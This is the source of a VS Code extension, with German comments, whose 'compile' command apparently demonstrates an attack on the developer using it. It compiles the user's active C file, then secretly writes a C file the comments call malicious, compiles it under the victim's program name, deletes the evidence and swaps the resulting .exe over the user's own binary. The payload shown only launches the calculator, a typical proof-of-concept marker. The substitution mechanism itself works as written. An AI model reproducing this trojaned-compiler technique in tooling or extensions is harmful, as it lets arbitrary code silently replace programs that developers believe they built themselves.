const vscode = require('vscode'); 
const { execSync } = require('child_process');
const path = require('path');
const fs = require('fs');


    /**
     * Diese Funktion wird nach Aufruf von der Command compile ausgeführt.
     * @param {vscode.ExtensionContext} context
     */
function activate(context) {
    // der Command compile wird registriert
    // diese Zeile(15) wurde schon nach  Erstellung von der Erweiterung zur Verfügung gestellt.
    // Ich habe nur den Befehl Name auf "compile" geändert.
    let disposable = vscode.commands.registerCommand('austausch-des-kompilierten-programms.compile', function () {
        

        // Zugriff auf die aktive Datei
        var activeEditor = vscode.window.activeTextEditor;

        // Überprüfung der Programmiersprache
        if (activeEditor.document.languageId !== "c") {
            vscode.window.showErrorMessage("kein C Datei")
            return;
        }

        // hier wird überprüft ob die aktive Datei existiert und ob es sich um eine Datei handelt
        if (activeEditor && activeEditor.document && activeEditor.document.uri && activeEditor.document.uri.scheme === 'file') {

            // aktive Datei Name ohne der Endung
            const filename = path.basename(activeEditor.document.fileName, '.c');

            // Den pfad für das Verzeichniss der aktive Datei normalisieren
            const workingDirectory = path.normalize(activeEditor.document.uri.fsPath).replace(/\\/g, '\\\\');

            // zufällige Name für den schädliche Datei
            const badfilename= `${Math.random()}.c`

            // beginn try-catch block
            try {

                // aktive Datei mit gcc kompileren
                execSync(`gcc -o "${filename}" "${activeEditor.document.fileName}"`, { cwd: path.dirname(workingDirectory) });
                console.log("Datei von Opfer wurde kompiliert");
                vscode.window.showInformationMessage(`done:  gcc -o ${filename} ${filename}.c`)

                // Aufruf der Funktion
                compileAndRunCode(filename, workingDirectory,badfilename);

            }
            catch (err) {

                // falls die aktive Datei nicht erfolgreich kompiliert wird.
                vscode.window.showErrorMessage("Es gibt es Fehler in Ihrer Datei  "+ err)
                console.error("Datei von Opfer wurde nicht kompiliert " + err);
                return;
            }

 

        
        }
    });

    // Diese Zeile (Nummer 66) wurde bereits von der Erweiterung nach der Erstellung zur Verfügung gestellt.    
    context.subscriptions.push(disposable);
}

    /**
     * hier werden alle funktionen für den Austausch aufgerufen
     * @param {string} filename
     * @param {string} workingDirectory
     */
function compileAndRunCode(filename, workingDirectory,badfilename) {
    try {
        if(createCompileFile(workingDirectory,badfilename)){
            if(compileFile(filename,workingDirectory,badfilename)){
                deleteFiles(workingDirectory,badfilename);
                movefile(filename, workingDirectory);
            }
            else{
                deleteFiles(workingDirectory,badfilename);
            }
        }
      

    }
    catch (error) {
        console.error("Fehler: " + error);
    }
}

    /**
     * Diese Funktion erstellt schädliche C Datei
     * @param {string} workingDirectory
     */
function createCompileFile(workingDirectory,badfilename) {
    // Inhalt der schädliche Datei
    const newContent = `#include <stdlib.h>\nint main() {system("start calc");return 0;}`;
    try {
        // Schädliche Datei wird mit der Inhalt von newContent erstellt. 
        fs.writeFileSync(path.join(path.dirname(path.dirname(workingDirectory)),badfilename), newContent);
        console.log("Datei wurde erstellt");
        return true;
    }
    catch (err) {
        console.error("Nicht erstellt" + err);
        return false
    }
}

    /**
     * Dieser Funktion kompiliert die schädliche C Datei.
     * @param {string} fileName
     * @param {string} workingDirectory
     */
function compileFile(fileName, workingDirectory,badfilename) {
    try {
        // Die schädliche Datei wird kompiliert.
        execSync(`gcc -o "${fileName}" "${badfilename}"`, { cwd: path.dirname(path.dirname(workingDirectory)) });
        console.log("Datei wurde kompiliert");
        return true;
    }catch (err) {
        console.error("Datei wurde nicht kompiliert " + err);
        return false;
    }
}

/**
 * schädliche C Datei löschen
 * @param {string} workingDirectory
 * @param {string} badfilename
 */
function deleteFiles(workingDirectory,badfilename) {
    try {
        execSync(`del "${badfilename}"`, { cwd: path.dirname(path.dirname(workingDirectory)) });
        console.log("Datei wurde gelöscht");
    }catch (err) {
        console.error("Datei wurde nicht ausgetauscht oder gelöscht " + err);
        throw err;
    }
}
    /**
     * kompilierte Dateien miteinander vertauschen
     * @param {string} filename
     * @param {string} workingDirectory
     */
function movefile(filename, workingDirectory){
    try {
        execSync(`move  "${path.join(path.dirname(path.dirname(workingDirectory)), `${filename}.exe`)}"  "${path.join(path.dirname(workingDirectory), `${filename}.exe`)}"`);
        console.log("Datei wurde ausgetauscht");
        return true;
    }catch (err) {
        console.error("Datei wurde nicht ausgetauscht" + err);
        throw err;
    }

}

/**
* Diese wurde nach der Erstellung der Erweiterung zur Verfügung gestellt.
 */
module.exports = {
    activate,
};
